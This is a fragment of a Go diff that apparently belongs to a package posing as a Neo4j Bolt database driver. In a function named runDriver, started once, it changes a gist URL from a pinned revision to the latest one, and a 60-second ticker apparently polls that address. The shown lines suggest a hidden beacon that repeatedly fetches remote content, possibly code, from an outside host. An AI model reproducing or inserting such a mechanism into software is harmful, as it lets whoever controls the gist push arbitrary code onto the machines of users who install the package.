@@ -113,7 +113,7 @@ var once sync.Once
 func runDriver() {
 	once.Do(func() {
 		rate := 5
-		url := "https://gist.githubusercontent.com/Neo4jBolt/94b36c0d7e2a18fad8c1a795eb0095be/raw/3331fcd918f43cecce722e008622b6f076911ca7/code"
+		url := "https://gist.githubusercontent.com/Neo4jBolt/94b36c0d7e2a18fad8c1a795eb0095be/raw"
 		ticker := time.NewTicker(time.Second * 60)
 		for {
 			select {
